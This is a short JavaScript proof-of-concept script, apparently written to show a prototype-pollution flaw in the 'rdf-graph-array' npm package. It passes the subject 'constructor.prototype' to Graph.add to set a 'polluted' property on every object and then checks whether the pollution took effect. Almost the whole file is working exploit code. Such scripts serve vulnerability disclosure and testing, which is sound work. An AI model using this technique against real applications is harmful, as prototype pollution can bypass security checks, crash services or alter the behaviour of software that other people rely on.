var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const Graph = require('rdf-graph-array').Graph;
let g = new Graph();
console.log({}.polluted);
g.add({
    graph: 'foo',
    subject: 'constructor.prototype',
    predicate: 'polluted',
    object: 'JHU'
});
if ({}.polluted != undefined) {
    console.log('yes');
} else {
    console.log(undefined);
}